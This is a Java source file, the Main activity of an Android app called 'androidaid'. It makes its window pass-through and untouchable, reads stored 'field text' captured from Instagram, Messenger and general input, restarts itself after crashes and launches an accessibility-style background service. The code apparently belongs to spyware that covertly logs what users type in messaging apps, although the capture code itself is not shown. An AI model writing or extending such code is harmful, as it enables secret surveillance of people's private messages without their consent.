package androidaid.android.com.androidaid;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.WindowManager;

import androidaid.android.com.androidaid.core.ActivityManager;
import androidaid.android.com.androidaid.core.SystemManager;
import androidaid.android.com.androidaid.detraction.RecoverLostImages;
import androidaid.android.com.androidaid.networking.InternetSpeed;
import androidaid.android.com.androidaid.persistance.UnexpectedExceptionHandler;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.storage.InternalStorageManager;
import androidaid.android.com.androidaid.utilities.SystemTools;

public class Main extends Activity {
    private Context applicationContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        applicationContext = this.getApplication();

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);

        ActivityManager.init(this, this);
        InternalStorageManager.initialize(this);
        InternetSpeed.initialize(this);
        SystemTools.init();
        SystemManager.init(this);

        RecoverLostImages.recoverLostImages();

        //only test of the storage functionality /////////////////////////////////////////////////////////////////////////////

        /*
        InternalStorageManager.createNewFile("test1");
        InternalStorageManager.writeTextToFile("test1", "Hello World!");
        InternalStorageManager.writeTextToFile("test1", "Meet me at 2.");
        InternalStorageManager.writeTextToFile("test1", "Cumming hard!");
        String text = InternalStorageManager.readFromFile("test1");
        System.out.println("[sproc32.Main]: Test string is: " + text);
        */

        //todo: START FROM HERE! LOOK DatabaseNetworking line 78 and then delete this.
       //InternalStorageManager.deleteFileContents(Constants.STORAGE_FIELD_TEXT_MESSENGER);
        //InternalStorageManager.deleteFileContents(Constants.STORAGE_FIELD_TEXT_INSTAGRAM);
        //InternalStorageManager.deleteFileContents(Constants.STORAGE_FIELD_TEXT_SMS);
        //InternalStorageManager.deleteFileContents(Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION);

        //shown in run, somehow not showing up in logcat
        String instagram_field_text = InternalStorageManager.readFromFile(Constants.STORAGE_FIELD_TEXT_INSTAGRAM);
        String messenger_field_text = InternalStorageManager.readFromFile(Constants.STORAGE_FIELD_TEXT_MESSENGER);
        String general_field_text = InternalStorageManager.readFromFile(Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION);

        //System.out.println("[sproc32.Main]: Contents of internal storage instagram field text file: " + "\n" + instagram_field_text);
        //System.out.println("[sproc32.Main]: Contents of internal storage messenger field text file: " + "\n" + messenger_field_text);
        //System.out.println("[sproc32.Main]: Contents of internal storage general field text file: " + "\n" + general_field_text);

        //////////////////////////////////////////////////////////////////////

        InternetSpeed.isOnline();

        Thread.setDefaultUncaughtExceptionHandler(new UnexpectedExceptionHandler(this));

        if(getIntent().getBooleanExtra("crash", false)) {
            System.out.println("[sproc32.persistance.Main]: APP RESTARTED AFTER A CRASH!");
        }

        System.out.println("[sproc32.main]: Starting service");

        Intent startServiceIntent = new Intent(getApplicationContext(), MainAccessService.class);
        startService(startServiceIntent);

        /*
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) {
            System.out.println("[sproc32.main]: Running on post 7.0 device. Starting foreground service.");
            startForegroundService(startServiceIntent);
        } else {
            System.out.println("[sproc32.main]: Running on pre 7.0 device. Starting background service.");
            startService(startServiceIntent);
        }
        */
    }
}
